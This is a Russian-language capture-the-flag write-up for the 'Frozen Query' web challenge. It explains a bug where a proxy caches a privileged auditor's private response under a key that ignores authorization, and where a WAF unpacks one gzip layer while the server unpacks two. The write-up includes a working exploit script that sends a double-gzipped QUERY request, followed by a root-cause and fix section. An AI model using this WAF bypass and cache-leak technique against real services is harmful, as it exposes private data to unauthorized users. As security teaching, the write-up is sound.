# Frozen Query — двойной gzip, обход WAF и утечка из кэша аудитора

[English version](solve.md)

**Задание:** GlacierCTF 2026 · web / http / cache / rfc10008 · EmberZero · 50 баллов.  
**Результат:** решено, флаг принят платформой. Оригинальный райтап участника фиксирует `HTTP 200`, `X-Cache: HIT` и выдачу закрытого бюллетеня с флагом.

**Источники:** проверены **два приложенных архива**: первый содержит оригинальные английский/русский райтапы, рабочий скрипт и исходники, второй — исходный handout организаторов. `app.py` и `backend.py` в обоих архивах **побайтово идентичны**. Поэтому прежнюю стороннюю реконструкцию заменяет изложение подтверждённого решения по исходникам.

## 1. Сервис и авторизация

`src/app.py` — edge reverse proxy на порту **1337**, `src/backend.py` — закрытый backend на `127.0.0.1:8000`. Простой `GET /api/bulletin` даёт `405 Allow: QUERY`; запросы `QUERY` для обычного региона `valley` обслуживаются без токена.

Backend возвращает закрытый бюллетень `summit` с флагом только при `Authorization: Bearer <AUDIT_TOKEN>`. Такой же токен нужен для запроса поля `flag`, независимо от региона. Без прав сервер отвечает 403.

На edge работает фоновая `auditor_loop()`: каждые **5 секунд** аудитор делает привилегированный `QUERY /api/bulletin` с телом:

```python
{"region":"summit",
 "fields":["level","note","flag"],
 "window":int(time.time()//30)}
```

Заголовки: `Authorization`, `Content-Type: application/vnd.glacier.bulletin+json`, `Accept: application/json` и `Cache-Control: no-cache`.

## 2. Почему приватный ответ попал в общий кэш

Backend устанавливает даже на закрытом бюллетене:

```text
Cache-Control: public, max-age=30
```

А edge решает вопрос кеширования так:

```python
shareable = not request.headers.get("Authorization") or "public" in cc
if upstream.status_code == 200 and ttl and "no-store" not in cc and shareable:
    cache_put(key, ttl, upstream.status_code, headers, upstream.content)
```

У аудитора `no-cache` запрещает **чтение** из кэша, но не **запись** в него. Директива `public` делает привилегированный ответ общим. Ключ кэша **не учитывает Authorization и личность клиента**. Аудитор обновляет запись примерно каждые пять секунд, TTL равен 30 секундам.

## 3. Требуется совпасть с точным ключом аудитора

Код `cache_key()`:

```python
canonical = json.dumps(json.loads(content), sort_keys=True, separators=(",", ":"))
material = "\n".join([path, media_type, accept, canonical])
key = hashlib.sha256(material.encode()).hexdigest()
```

Нормализация `Content-Type` превращает `application/*+json` в `application/json`. Ключ определяется четырьмя значениями:

| Компонент | Нужное значение |
| --- | --- |
| Path | `/api/bulletin` |
| Content-Type после нормализации | `application/json` |
| Accept | `application/json` |
| JSON (отсортирован) | `{"fields":["level","note","flag"],"region":"summit","window":ТЕКУЩИЕ_30_СЕК}` |

Но обычный запрос с `summit` и `flag` до кэша не дойдёт: на пути не-аудитора работает WAF.

## 4. Расхождение в распаковке: один слой против двух

Из оригинального `src/app.py`:

```python
def waf_allows(body, encoding):
    codings = parse_codings(encoding)
    if codings and codings[-1] == "gzip":
        body = gunzip(body)
    try:
        text = json.dumps(json.loads(body))
    except ValueError:
        text = body.decode("latin-1")
    return not any(word in text.lower() for word in ("flag", "summit"))

def decode_content(body, encoding):
    for _ in reversed(parse_codings(encoding)):
        body = gunzip(body)
    return body
```

Парсер разрешает до **трёх** значений `Content-Encoding`, причём только `gzip`. Отправляем:

```text
Content-Encoding: gzip, gzip
Body: gzip(gzip(JSON))
```

Что происходит:

1. WAF снимает **один** слой и видит всё ещё сжатую последовательность байтов — букв `summit` и `flag` там нет.
2. `decode_content` снимает **оба** слоя, получая исходный JSON с закрытыми полями.
3. Канонизация строит **тот же ключ**, что у авторизованного аудитора.
4. Если аудитор уже опросил текущий `window`, прокси отдаёт **`X-Cache: HIT`** и приватный ответ без какого-либо токена у атакующего.

Это не классическая инъекция, а расхождение между представлением запроса, которое проверяет WAF, и представлением, которое затем использует сервер.

## 5. Оригинальный эксплойт

В загруженных материалах действительно есть `scripts/exploit_frozen_query.py`; это **не восстановленная по чужому райтапу программа**, а архивированный скрипт из решения.

```python
window = int(time.time()//30)
body = json.dumps({
    "region":"summit",
    "fields":["level","note","flag"],
    "window":window,
})
raw = gzip.compress(gzip.compress(body.encode()))
headers = {
    "Content-Type":"application/vnd.glacier.bulletin+json",
    "Accept":"application/json",
    "Content-Encoding":"gzip, gzip",
    "Cache-Control":"max-age=0",
}
r = requests.request(
    "QUERY", "https://frozen-query.web.glacierctf.com/api/bulletin",
    data=raw, headers=headers, timeout=15)
```

Отдельно сохранён [вариант с параметром URL и повторными попытками](scripts/solve.py), полезный для ожидания аудитора. Оригинал — [exploit_frozen_query.py](scripts/exploit_frozen_query.py).

Важно **не ставить `Cache-Control: no-cache` в атакующем запросе**: иначе edge пропустит `cache_get`, запрос уйдёт в backend без токена и вернёт 403.

## 6. Что проверено

- Обычный JSON с `summit`/`flag`: WAF возвращает `403 blocked by glacier-edge`.
- Один слой gzip: WAF распаковывает его, видит слова и снова возвращает 403.
- `Cache-Control: no-cache` при атаке: чтение кэша пропускается, backend возвращает 403.
- Другая величина `window`: ключ не совпадает, наблюдается `MISS`.
- Правильные заголовки, двойной gzip и текущий `window`: записано **`HTTP 200` и `X-Cache: HIT`**, внутри бюллетень `summit` с флагом.

## 7. Первопричина и исправление

Сразу две ошибки: приватный ответ аудитора сохраняется в общей зоне кэша без привязки к пользователю, а WAF распаковывает тело не так, как реальная обработка запроса. Требуется **полная единая канонизация перед проверкой**, а приватный ответ нельзя выдавать по cache key, не содержащему уровень полномочий.

## 8. Точность доказательств

Оригинальные райтапы и скрипт приложены, но отдельного сырого захвата HTTP-ответа нет. В исследовательском архиве полное значение флага скрыто: зафиксированы только его начало `gctf{QU3RY_` и конец `r3qu35t}`. **Статус принятия платформой подтверждён пользователем**; недостающую середину флага не выдумываем.
